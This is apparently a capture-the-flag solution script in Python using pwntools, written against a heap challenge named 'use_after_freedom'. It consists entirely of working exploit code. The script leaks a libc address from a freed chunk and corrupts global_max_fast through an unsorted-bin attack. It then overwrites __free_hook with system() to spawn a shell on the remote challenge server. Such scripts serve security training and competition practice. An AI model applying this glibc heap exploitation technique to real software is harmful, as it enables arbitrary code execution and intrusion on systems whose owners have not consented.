from pwn import *

p = remote('use-after-freedom.hsc.tf','1337')
#p = process('./use_after_freedom')
elf = ELF('./use_after_freedom')
#libc = elf.libc
libc = ELF('./libc-2.27.so')

def add(size,con):
    p.sendlineafter('> ',str(1))
    p.sendlineafter('> ',str(size))
    p.sendafter('> ',con)

def free(idx):
    p.sendlineafter('> ',str(2))
    p.sendlineafter('> ',str(idx))

def edit(idx,con):
    p.sendlineafter('> ',str(3))
    p.sendlineafter('> ',str(idx))
    p.sendafter('> ',con)

def view(idx):
    p.sendlineafter('> ',str(4))
    p.sendlineafter('> ',str(idx))

#context.log_level='debug'

add(0x3940,'A'*0x8) #0
add(0x410,'A'*0x10) #1
add(0x30,'/bin/sh\x00')  #2
free(1)
view(1)

off = 0x3ebca0
temp = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00')
libc_base = temp-off
p.info('libc_base: '+hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
main_arena = temp-96
max_fast = main_arena+0x1d00


edit(1,p64(0)+p64(max_fast-0x10))
add(0x410,p64(0)*2)  #3
free(0)
edit(0,p64(system))
add(0x3940,'A')  #4
free(2)


#gdb.attach(p)
p.interactive()
